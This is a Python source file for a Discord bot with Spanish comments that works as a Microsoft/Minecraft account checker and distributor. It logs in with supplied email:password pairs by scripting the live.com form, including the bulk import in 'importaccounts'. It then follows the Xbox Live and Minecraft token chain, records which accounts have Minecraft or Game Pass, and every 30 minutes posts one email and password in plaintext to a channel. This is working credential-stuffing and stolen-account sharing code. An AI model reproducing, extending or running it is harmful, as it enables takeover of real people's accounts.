# -*- coding: utf-8 -*-
import discord
from discord.ext import commands, tasks
import json
import os
from datetime import datetime
from threading import Thread
from flask import Flask
import asyncio
import aiohttp
import re
from urllib.parse import urlparse, parse_qs
from dotenv import load_dotenv

# Cargar variables de entorno
load_dotenv()

# --- Configuración Inicial ---
TOKEN = os.environ.get('DISCORD_TOKEN')
CHANNEL_ID = int(os.environ.get('CHANNEL_ID', 0))
DISTRIBUTION_INTERVAL_MINUTES = 30.0

# Validar variables de entorno requeridas
if not TOKEN:
    print("❌ ERROR: DISCORD_TOKEN no está configurado")
    exit(1)
if CHANNEL_ID == 0:
    print("❌ ERROR: CHANNEL_ID no está configurado")
    exit(1)

# --- Rutas de Archivos ---
DATA_DIR = 'data'
ACCOUNTS_FILE = os.path.join(DATA_DIR, 'accounts.json')
LOGS_FILE = os.path.join(DATA_DIR, 'logs.txt')

# Asegurarse de que las carpetas y archivos existan
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

for file_path in [ACCOUNTS_FILE, LOGS_FILE]:
    if not os.path.exists(file_path):
        if file_path.endswith('.json'):
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump({'available': [], 'distributed': []}, f, indent=4)
        else:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write('--- Archivo de Registro de Cuentas ---\n')

# --- Definición del Bot ---
intents = discord.Intents.default()
intents.message_content = True
intents.reactions = True

class AccountBot(commands.Bot):
    def __init__(self):
        super().__init__(
            command_prefix='!',
            intents=intents,
            help_command=None
        )
        self.accounts_data = {'available': [], 'distributed': []}
        self.registered_emails = set()
        self.temp_verified_accounts = {}

bot = AccountBot()

# --- Funciones de Autenticación (Método del Checker) ---

async def get_microsoft_token(session, email, password):
    """Obtiene token de Microsoft usando el mismo método del checker"""
    try:
        # Paso 1: Obtener página de login
        auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        
        async with session.get(auth_url) as response:
            text = await response.text()
            
            # Buscar sFTTag (PPFT)
            sFTTag_match = re.search(r'value="([^"]+)" name="PPFT"', text)
            if not sFTTag_match:
                sFTTag_match = re.search(r'value="([^"]+)" id="i0327"', text)
            
            if not sFTTag_match:
                return {"success": False, "error": "No se pudo obtener sFTTag"}
            
            sFTTag = sFTTag_match.group(1)
            
            # Buscar URL Post
            urlPost_match = re.search(r'urlPost:\s*[\'"]([^\'"]+)[\'"]', text)
            if not urlPost_match:
                return {"success": False, "error": "No se pudo obtener URL Post"}
            
            urlPost = urlPost_match.group(1)

        # Paso 2: Enviar credenciales
        data = {
            'login': email,
            'loginfmt': email,
            'passwd': password,
            'PPFT': sFTTag
        }
        
        async with session.post(
            urlPost,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=True
        ) as response:
            
            # Verificar si la autenticación fue exitosa
            if 'access_token' in str(response.url):
                # Extraer token de la URL
                parsed = urlparse(str(response.url))
                fragment = parse_qs(parsed.fragment)
                access_token = fragment.get('access_token', [None])[0]
                
                if access_token:
                    return {"success": True, "access_token": access_token}
            
            # Leer respuesta para detectar errores
            response_text = await response.text()
            
            if "password is incorrect" in response_text.lower():
                return {"success": False, "error": "Contraseña incorrecta"}
            elif "account doesn't exist" in response_text.lower():
                return {"success": False, "error": "La cuenta no existe"}
            elif "recover" in response_text.lower() or "two-step" in response_text.lower():
                return {"success": False, "error": "Verificación en dos pasos requerida"}
            else:
                return {"success": False, "error": "Error de autenticación"}

    except Exception as e:
        return {"success": False, "error": f"Error de conexión: {str(e)}"}

async def get_xbox_live_token(session, microsoft_token):
    """Obtiene token de Xbox Live"""
    try:
        data = {
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com", 
                "RpsTicket": f"d={microsoft_token}"
            },
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }
        
        async with session.post(
            'https://user.auth.xboxlive.com/user/authenticate',
            json=data,
            headers={'Content-Type': 'application/json'}
        ) as response:
            if response.status == 200:
                data = await response.json()
                return {"success": True, "data": data}
            else:
                return {"success": False, "error": f"Error Xbox Live: {response.status}"}
                
    except Exception as e:
        return {"success": False, "error": f"Error Xbox Live: {str(e)}"}

async def get_xsts_token(session, xbox_token):
    """Obtiene token XSTS"""
    try:
        data = {
            "Properties": {
                "SandboxId": "RETAIL",
                "UserTokens": [xbox_token]
            },
            "RelyingParty": "rp://api.minecraftservices.com/",
            "TokenType": "JWT"
        }
        
        async with session.post(
            'https://xsts.auth.xboxlive.com/xsts/authorize',
            json=data,
            headers={'Content-Type': 'application/json'}
        ) as response:
            if response.status == 200:
                data = await response.json()
                return {"success": True, "data": data}
            else:
                return {"success": False, "error": f"Error XSTS: {response.status}"}
                
    except Exception as e:
        return {"success": False, "error": f"Error XSTS: {str(e)}"}

async def get_minecraft_token(session, uhs, xsts_token):
    """Obtiene token de Minecraft"""
    try:
        data = {
            'identityToken': f"XBL3.0 x={uhs};{xsts_token}"
        }
        
        async with session.post(
            'https://api.minecraftservices.com/authentication/login_with_xbox',
            json=data,
            headers={'Content-Type': 'application/json'}
        ) as response:
            if response.status == 200:
                data = await response.json()
                return {"success": True, "access_token": data.get('access_token')}
            else:
                return {"success": False, "error": f"Error Minecraft auth: {response.status}"}
                
    except Exception as e:
        return {"success": False, "error": f"Error Minecraft auth: {str(e)}"}

async def get_minecraft_profile(session, access_token):
    """Obtiene perfil completo de Minecraft"""
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        
        # Obtener perfil básico
        async with session.get('https://api.minecraftservices.com/minecraft/profile', headers=headers) as response:
            if response.status == 200:
                profile_data = await response.json()
                
                # Obtener información de name change
                name_change_data = None
                async with session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers=headers) as name_response:
                    if name_response.status == 200:
                        name_change_data = await name_response.json()
                
                # Obtener entitlements
                entitlements_data = None
                async with session.get('https://api.minecraftservices.com/entitlements/mcstore', headers=headers) as entitle_response:
                    if entitle_response.status == 200:
                        entitlements_data = await entitle_response.json()
                
                return {
                    "success": True,
                    "profile": profile_data,
                    "name_change": name_change_data,
                    "entitlements": entitlements_data
                }
            else:
                return {"success": False, "error": "Cuenta sin Minecraft"}
                
    except Exception as e:
        return {"success": False, "error": f"Error obteniendo perfil: {str(e)}"}

async def verify_microsoft_account(email, password):
    """
    Verificación completa siguiendo el flujo del checker original
    """
    try:
        # Validación básica
        if "@" not in email or "." not in email:
            return {"success": False, "error": "Formato de email inválido"}
        
        if len(password) < 1:
            return {"success": False, "error": "La contraseña no puede estar vacía"}

        # Configurar sesión
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(verify_ssl=False)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        ) as session:

            # Paso 1: Token de Microsoft
            microsoft_result = await get_microsoft_token(session, email, password)
            if not microsoft_result["success"]:
                return microsoft_result

            # Paso 2: Token de Xbox Live
            xbox_result = await get_xbox_live_token(session, microsoft_result["access_token"])
            if not xbox_result["success"]:
                return xbox_result

            xbox_data = xbox_result["data"]
            xbox_token = xbox_data.get('Token')
            uhs = xbox_data['DisplayClaims']['xui'][0]['uhs']

            # Paso 3: Token XSTS
            xsts_result = await get_xsts_token(session, xbox_token)
            if not xsts_result["success"]:
                return xsts_result

            xsts_data = xsts_result["data"]
            xsts_token = xsts_data.get('Token')

            # Paso 4: Token de Minecraft
            minecraft_token_result = await get_minecraft_token(session, uhs, xsts_token)
            if not minecraft_token_result["success"]:
                return minecraft_token_result

            minecraft_token = minecraft_token_result["access_token"]

            # Paso 5: Perfil de Minecraft
            profile_result = await get_minecraft_profile(session, minecraft_token)
            if not profile_result["success"]:
                return {"success": True, "has_minecraft": False, "email": email, "password": password}

            # Procesar información completa
            profile_data = profile_result["profile"]
            name_change_data = profile_result["name_change"]
            entitlements_data = profile_result["entitlements"]

            # Información de capas
            capes = []
            if 'capes' in profile_data:
                for cape in profile_data['capes']:
                    capes.append(cape.get('alias', 'Unknown'))

            # Tipo de cuenta
            account_type = "Normal"
            if entitlements_data and 'items' in entitlements_data:
                for item in entitlements_data['items']:
                    name = item.get('name', '')
                    if 'game_pass_ultimate' in name:
                        account_type = "Xbox Game Pass Ultimate"
                    elif 'game_pass' in name:
                        account_type = "Xbox Game Pass"

            # Información de cambio de nombre
            name_changeable = "No"
            if name_change_data:
                name_changeable = "Sí" if name_change_data.get('nameChangeAllowed', False) else "No"

            # Fecha de creación
            creation_date = "Desconocida"
            if name_change_data and 'createdAt' in name_change_data:
                try:
                    created_at = name_change_data['createdAt']
                    # Convertir fecha
                    dt = datetime.fromisoformat(created_at.replace('Z', '+00:00'))
                    # Formatear en español
                    days_es = ["lunes", "martes", "miércoles", "jueves", "viernes", "sábado", "domingo"]
                    months_es = ["enero", "febrero", "marzo", "abril", "mayo", "junio", 
                                "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"]
                    
                    day_name = days_es[dt.weekday()]
                    month_name = months_es[dt.month - 1]
                    
                    creation_date = f"{day_name}, {dt.day} de {month_name} de {dt.year}, {dt.hour}:{dt.minute:02d}"
                except:
                    creation_date = "Desconocida"

            return {
                "success": True,
                "has_minecraft": True,
                "email": email,
                "password": password,
                "details": {
                    "username": profile_data.get('name', 'No disponible'),
                    "uuid": profile_data.get('id', 'No disponible'),
                    "account_type": account_type,
                    "capes": ", ".join(capes) if capes else "Ninguna",
                    "name_changeable": name_changeable,
                    "creation_date": creation_date,
                    "access_token": minecraft_token
                }
            }

    except Exception as e:
        return {"success": False, "error": f"Error inesperado: {str(e)}"}

# --- Funciones Auxiliares ---

def load_accounts():
    """Carga los datos de las cuentas desde el archivo JSON."""
    try:
        with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            if 'available' in data and 'distributed' in data:
                bot.accounts_data = data
                bot.registered_emails.clear()
                for account in bot.accounts_data['distributed']:
                    if 'gmail' in account:
                        bot.registered_emails.add(account['gmail'].lower())
                for account in bot.accounts_data['available']:
                    if 'gmail' in account:
                        bot.registered_emails.add(account['gmail'].lower())
                print(f"✅ Cuentas cargadas: {len(bot.accounts_data['available'])} disponibles")
                return True
    except Exception as e:
        print(f"❌ Error cargando cuentas: {e}")
    return False

def save_accounts():
    """Guarda los datos de las cuentas en el archivo JSON."""
    try:
        with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
            json.dump(bot.accounts_data, f, indent=4)
    except Exception as e:
        print(f"❌ Error guardando cuentas: {e}")

# --- Comandos ---

@bot.command(name='verifyaccount')
@commands.has_permissions(administrator=True)
async def verify_account(ctx, email: str, password: str):
    """Verifica una cuenta de Microsoft y muestra información completa."""
    
    processing_msg = await ctx.send("🔍 **Verificando cuenta Microsoft...**\n⏳ Esto puede tomar 15-20 segundos")
    
    try:
        result = await verify_microsoft_account(email, password)
        await processing_msg.delete()
        
        if result["success"]:
            if result.get("has_minecraft", False):
                details = result["details"]
                
                embed = discord.Embed(
                    title="✅ **CUENTA VERIFICADA - MINECRAFT DETECTADO**",
                    color=0x00ff00,
                    description="Se ha verificado exitosamente la cuenta de Microsoft"
                )
                
                # Credenciales
                embed.add_field(
                    name="📧 **CREDENCIALES**",
                    value=f"```\nEmail: {email}\nContraseña: {password}\n```",
                    inline=False
                )
                
                # Información de la cuenta
                embed.add_field(
                    name="👤 **INFORMACIÓN DE CUENTA**",
                    value=f"**Usuario:** `{details['username']}`\n**UUID:** `{details['uuid']}`\n**Tipo:** {details['account_type']}",
                    inline=False
                )
                
                # Personalización
                embed.add_field(
                    name="🎨 **PERSONALIZACIÓN**",
                    value=f"**Capas Minecraft:** {details['capes']}\n**Puede cambiar nombre:** {details['name_changeable']}",
                    inline=True
                )
                
                # Información adicional
                embed.add_field(
                    name="📅 **INFORMACIÓN ADICIONAL**", 
                    value=f"**Fecha de creación:** {details['creation_date']}",
                    inline=True
                )
                
                embed.set_footer(text="Reacciona con ✅ para añadir al inventario o ❌ para cancelar")
                
            else:
                # Cuenta sin Minecraft
                embed = discord.Embed(
                    title="✅ **CUENTA VERIFICADA - SIN MINECRAFT**",
                    color=0xffff00,
                    description="Cuenta Microsoft válida pero sin Minecraft"
                )
                
                embed.add_field(
                    name="📧 **CREDENCIALES**",
                    value=f"```\nEmail: {email}\nContraseña: {password}\n```",
                    inline=False
                )
                
                embed.add_field(
                    name="💡 **ESTADO**",
                    value="Esta cuenta de Microsoft es válida pero no tiene Minecraft asociado.",
                    inline=False
                )
                
                embed.set_footer(text="Reacciona con ✅ para añadir al inventario o ❌ para cancelar")
            
            message = await ctx.send(embed=embed)
            await message.add_reaction("✅")
            await message.add_reaction("❌")
            
            bot.temp_verified_accounts[message.id] = {
                "email": email,
                "password": password,
                **result
            }
            
        else:
            # Error
            embed = discord.Embed(
                title="❌ **ERROR EN VERIFICACIÓN**",
                color=0xff0000
            )
            
            embed.add_field(
                name="📧 **CREDENCIALES**",
                value=f"```\nEmail: {email}\nContraseña: {password}\n```",
                inline=False
            )
            
            embed.add_field(
                name="🚨 **ERROR DETECTADO**",
                value=result["error"],
                inline=False
            )
            
            await ctx.send(embed=embed)
            
    except Exception as e:
        await processing_msg.delete()
        embed = discord.Embed(
            title="💥 **ERROR CRÍTICO**",
            description=f"Error inesperado: ```{str(e)}```",
            color=0xff0000
        )
        await ctx.send(embed=embed)

# ... (el resto de los comandos se mantiene igual: importaccounts, addaccount, stats, help)

@bot.command(name='importaccounts')
@commands.has_permissions(administrator=True)
async def import_accounts(ctx):
    """Importa cuentas desde un archivo de texto."""
    file_path = "import_accounts.txt"
    
    if not os.path.exists(file_path):
        embed = discord.Embed(
            title="❌ **Archivo No Encontrado**",
            description=f"No se encontró el archivo `{file_path}`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return

    processing_msg = await ctx.send("📥 **Importando cuentas...**")
    
    try:
        success_count = 0
        fail_count = 0
        duplicate_count = 0
        remaining_lines = []

        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.read().splitlines()
        
        for line in lines:
            stripped_line = line.strip()
            if not stripped_line:
                continue

            if stripped_line.count(":") != 1:
                remaining_lines.append(line)
                fail_count += 1
                continue

            try:
                email, password = stripped_line.split(":", 1)
                email_lower = email.lower().strip()

                if email_lower in bot.registered_emails:
                    duplicate_count += 1
                    continue
                
                new_account = {
                    'username': email,
                    'gmail': email,
                    'password': password,
                    'added_date': datetime.now().isoformat(),
                    'added_by': 'import'
                }
                
                bot.accounts_data['available'].append(new_account)
                bot.registered_emails.add(email_lower)
                success_count += 1

            except Exception as e:
                remaining_lines.append(line)
                fail_count += 1

        save_accounts()

        # Manejar archivo restante
        if remaining_lines:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(remaining_lines) + '\n')
        else:
            try:
                os.remove(file_path)
            except:
                pass

        # Mostrar resultados
        embed = discord.Embed(
            title="📊 **Resultados de Importación**",
            color=0x0099ff
        )
        embed.add_field(name="✅ Correctas", value=success_count, inline=True)
        embed.add_field(name="🔄 Duplicadas", value=duplicate_count, inline=True)
        embed.add_field(name="❌ Fallidas", value=fail_count, inline=True)
        embed.add_field(name="📦 Total Inventario", value=f"{len(bot.accounts_data['available'])}", inline=False)
        
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ **Error en Importación**",
            description=f"Error: {str(e)}",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    
    finally:
        await processing_msg.delete()

@bot.command(name='addaccount')
@commands.has_permissions(administrator=True)
async def add_account(ctx, email: str, password: str):
    """Añade una cuenta manualmente."""
    email_lower = email.lower()

    if email_lower in bot.registered_emails:
        embed = discord.Embed(
            title="❌ **Cuenta Duplicada**",
            description=f"La cuenta `{email}` ya existe.",
            color=0xff0000
        )
        await ctx.send(embed=embed)
        return

    new_account = {
        'username': email,
        'gmail': email,
        'password': password,
        'added_date': datetime.now().isoformat(),
        'added_by': str(ctx.author)
    }
    
    bot.accounts_data['available'].append(new_account)
    bot.registered_emails.add(email_lower)
    save_accounts()

    embed = discord.Embed(
        title="✅ **Cuenta Añadida**",
        color=0x00ff00
    )
    embed.add_field(name="📧 Email", value=email, inline=True)
    embed.add_field(name="📊 Total", value=f"{len(bot.accounts_data['available'])}", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='stats')
async def stats(ctx):
    """Muestra estadísticas del inventario."""
    embed = discord.Embed(title="📊 **Estadísticas**", color=0x0099ff)
    embed.add_field(name="📥 Disponibles", value=len(bot.accounts_data['available']), inline=True)
    embed.add_field(name="📤 Distribuidas", value=len(bot.accounts_data['distributed']), inline=True)
    await ctx.send(embed=embed)

@bot.command(name='help')
async def help_command(ctx):
    """Muestra ayuda de comandos."""
    embed = discord.Embed(
        title="🤖 **Comandos Disponibles**",
        color=0x0099ff
    )
    
    commands_list = [
        ("!verifyaccount <email> <contraseña>", "Verifica una cuenta Microsoft"),
        ("!addaccount <email> <contraseña>", "Añade una cuenta manualmente"),
        ("!importaccounts", "Importa cuentas desde import_accounts.txt"),
        ("!stats", "Muestra estadísticas del inventario"),
        ("!help", "Muestra esta ayuda")
    ]
    
    for cmd, desc in commands_list:
        embed.add_field(name=cmd, value=desc, inline=False)
    
    await ctx.send(embed=embed)

# --- Manejo de Reacciones ---
@bot.event
async def on_reaction_add(reaction, user):
    if user.bot:
        return

    if reaction.message.id in bot.temp_verified_accounts:
        if str(reaction.emoji) == "✅" and user != bot.user:
            account_data = bot.temp_verified_accounts[reaction.message.id]
            email_lower = account_data["email"].lower()
            
            if email_lower not in bot.registered_emails:
                new_account = {
                    'username': account_data["email"],
                    'gmail': account_data["email"],
                    'password': account_data["password"],
                    'verified': True,
                    'added_date': datetime.now().isoformat(),
                    'added_by': str(user)
                }
                
                if account_data.get("has_minecraft") and "details" in account_data:
                    new_account.update(account_data["details"])
                
                bot.accounts_data['available'].append(new_account)
                bot.registered_emails.add(email_lower)
                save_accounts()
                
                await reaction.message.reply("✅ **Cuenta añadida al inventario!**")
            else:
                await reaction.message.reply("❌ **Esta cuenta ya existe en el inventario.**")
            
            del bot.temp_verified_accounts[reaction.message.id]
            await reaction.message.clear_reactions()
        
        elif str(reaction.emoji) == "❌" and user != bot.user:
            await reaction.message.reply("❌ **Cuenta descartada.**")
            del bot.temp_verified_accounts[reaction.message.id]
            await reaction.message.clear_reactions()

# --- Eventos del Bot ---
@bot.event
async def on_ready():
    print(f'🤖 Bot conectado como {bot.user}')
    load_accounts()
    
    if not distribute_account.is_running():
        distribute_account.start()
    
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"{len(bot.accounts_data['available'])} cuentas"
        )
    )

@tasks.loop(minutes=DISTRIBUTION_INTERVAL_MINUTES)
async def distribute_account():
    """Distribuye cuentas automáticamente."""
    try:
        channel = bot.get_channel(CHANNEL_ID)
        if channel and bot.accounts_data['available']:
            account = bot.accounts_data['available'].pop(0)
            
            embed = discord.Embed(
                title="🎁 **Cuenta Disponible**",
                color=0x0099ff
            )
            embed.add_field(name="📧 Email", value=f"`{account['gmail']}`", inline=False)
            embed.add_field(name="🔒 Contraseña", value=f"`{account['password']}`", inline=False)
            
            # Mostrar nombre de Minecraft si está disponible
            if 'username' in account and account['username'] != 'No disponible':
                embed.add_field(name="🎮 Usuario Minecraft", value=account['username'], inline=True)
            
            embed.set_footer(text="Reacciona: ✅ Usada | ❌ Error | 🚨 Bloqueada")
            
            message = await channel.send(embed=embed)
            await message.add_reaction("✅")
            await message.add_reaction("❌")
            await message.add_reaction("🚨")
            
            save_accounts()
            
    except Exception as e:
        print(f"Error en distribución: {e}")

# --- Keep Alive ---
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Bot de Cuentas Microsoft - En línea"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_flask, daemon=True)
    t.start()

# --- Ejecución ---
if __name__ == '__main__':
    keep_alive()
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Error iniciando bot: {e}")
